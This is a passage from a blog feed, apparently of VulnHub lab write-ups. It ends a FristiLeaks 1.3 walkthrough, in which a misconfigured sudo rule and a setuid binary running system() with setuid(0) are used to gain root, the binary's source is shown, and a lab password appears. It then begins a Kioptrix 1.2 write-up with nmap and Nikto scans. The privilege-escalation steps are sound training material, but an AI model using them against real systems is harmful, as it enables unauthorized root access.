|&lt;span class=&quot;nv&quot;&gt;$0H&lt;/span&gt;
Nice try, but wrong user &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
Usage: ./program_name terminal_command ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesting, looks like it’s using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt; and is written in C. Let’s check the sudo configuration for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fristigod&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fristigod: LetThereBeFristi!

Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fristigod on this host:
    requiretty, &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, always_set_home, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;&lt;/span&gt;,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin

User fristigod may run the following commands on this host:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fristi : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /var/fristigod/.secret_admin_stuff/doCom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh nice, so we can run this script as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fristi&lt;/code&gt;. One thing to note here is that the declared script is stored in a different directory than our home directory. It’s in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/fristigod/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Cool, let’s see what happens when we try to run it using sudo:&lt;/p&gt;

&lt;p class=&quot;box-note&quot;&gt;&lt;strong&gt;Note:&lt;/strong&gt; make sure to supply the full path when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;running-docom-with-sudo--u&quot;&gt;Running doCom with sudo -u:&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; fristi /var/fristigod/.secret_admin_stuff/doCom
Usage: ./program_name terminal_command ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the output denotes that it takes a terminal command as a positional argument. Okay, let’s try giving it a command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; fristi /var/fristigod/.secret_admin_stuff/doCom &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,502&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fristigod&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh sweet, we have a UID of 0. Let’s simply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; to root:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; fristi /var/fristigod/.secret_admin_stuff/doCom su root
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; fristi /var/fristigod/.secret_admin_stuff/doCom su root
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost fristigod]# &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami
id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost fristigod]# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And that’s it! Rooted!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fristileaks_secrets.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;https://tldr.nu]

I wonder &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you beat it &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the maximum 4 hours it&lt;span class=&quot;s1&quot;&gt;'s supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also, if you’re curious why the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCom&lt;/code&gt; binary gives us the root UID instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fristi&lt;/code&gt;’s UID, we can see via the source code:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doCom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define MAX_CMN_LEN 100
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAX_CMN_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;userID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;503&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nice try, but wrong user ;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*no command specified*/&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: ./program_name terminal_command ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; command issues the root UID, hence why we have direct root. Cool!&lt;/p&gt;</content><author><name>Ash</name></author><category term="VulnHub" /><category term="VulnHub" /><category term="FristiLeaks" /><category term="Nikto" /><category term="Webshells" /><category term="Reversing" /><category term="Sudo" /><summary type="html">FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It's by far one of my favorite VulnHub boxes I've done, as it involves some fun and simple reversing/code analysis. It also involves practice hopping around and enumerating a Linux environment from the perspective of multiple users, and requires some creative thinking.The challenge begins by using some simple guesswork to find a login portal. The source code of this login portal cotains an HTML comment that leaks a base64 encoded image. After decoding the image, we are able to gather the password used to login to web application. We exploit the web application's upload functionality to upload a PHP reverse shell and get a reverse shell. Privilege escalation involves abusing a cronjob, reversing a simple python cryptography algorithm, reusing passwords, and a sudo misconfiguration to finally gather root.</summary></entry><entry><title type="html">Kioptrix Level 1.2 (#3) Writeup - VulnHub</title><link href="http://localhost:4000/Kioptrix-Level-1.2/" rel="alternate" type="text/html" title="Kioptrix Level 1.2 (#3) Writeup - VulnHub" /><published>2020-07-29T00:00:00-04:00</published><updated>2020-07-29T00:00:00-04:00</updated><id>http://localhost:4000/Kioptrix-Level-1.2</id><content type="html" xml:base="http://localhost:4000/Kioptrix-Level-1.2/">&lt;p&gt;Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience with reusing credentials, attacking common web applications, and cracking hashed passwords.&lt;/p&gt;

&lt;p&gt;We start by exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LotusCMS&lt;/code&gt; to get a shell as www-data. From there, we find MySQL credentials that we use to login to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpMyAdmin&lt;/code&gt; and dump hashed user passwords.&lt;/p&gt;

&lt;p&gt;Finally, after cracking and logging in using these credentials, we exploit a sudo misconfiguration that allows us to privilege escalate using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ht&lt;/code&gt; text editor.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;Some of the intro documentation mentions that it’s useful to add the box to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;, so let’s go ahead and do that:&lt;/p&gt;

&lt;p&gt;We’ll open up the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;vim /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then simply add:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.0.0.204      kio3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s proceed as usual now.&lt;/p&gt;

&lt;h3 id=&quot;nmap-scans&quot;&gt;NMAP Scans&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sSV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; Kioptrix1.2 kio3
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-07-28 22:56 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;kio3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.0.204&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.2.8 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
|_http-server-header: Apache/2.2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 08:00:27:AA:71:E0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we’ve got port 22 and 80. Looks like this will be heavily web-app based. Cool. Let’s get going.&lt;/p&gt;

&lt;p&gt;I’ll start by running Nikto on the host:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nikto &lt;span class=&quot;nt&quot;&gt;-host&lt;/span&gt; kio3 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; nikto.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;While this runs in the background, let’s take a look at the webpage using Firefox:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_1.PNG&quot; alt=&quot;Viewing the webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ll click around the website and see what we can find, we can start by taking a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog&lt;/code&gt; page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_2.PNG&quot; alt=&quot;Viewing the Blog&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Not much here, but I did notice a call out to a user known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loneferret&lt;/code&gt;, let’s note this as it could be a valid username for later.&lt;/p&gt;

&lt;p&gt;Anyways, let’s continue by looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/gallery&lt;/code&gt; which is menitoned in a couple places.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_3.PNG&quot; alt=&quot;Viewing the Blog&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the most part, this whole thing looks severely broken. Maybe looking at the source HTML will give us some clues:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_4.PNG&quot; alt=&quot;Viewing the Blog source&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay, one thing that immediately sticks out is the HTML comment containing:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;!-- &amp;lt;a href=&quot;gadmin&quot;&amp;gt;Admin&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp; --&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you know HTML, you know that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;href&lt;/code&gt; value will pull in another resource, whether from an external source or a locally hosted resource… is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadmin&lt;/code&gt; a resource on the web server?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_5.PNG&quot; alt=&quot;Trying to access `gadmin`&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sure is! Cool. Let’s note that, and look at the remaining pieces of baseline enumeration. Last thing on my list is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; button on the orignal homepage, let’s take a look at what this redirects to:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_6.PNG&quot; alt=&quot;Taking a look at the login page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, so it’s a login form to some admin panel… Looks like it’s related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LotusCMS&lt;/code&gt;, let’s note that down.&lt;/p&gt;

&lt;p&gt;At this point, Nikto has finished executing, producing the following resutls:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.0.204
+ Target Hostname:    kio3
+ Target Port:        80
+ Start Time:         2020-07-28 22:58:59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
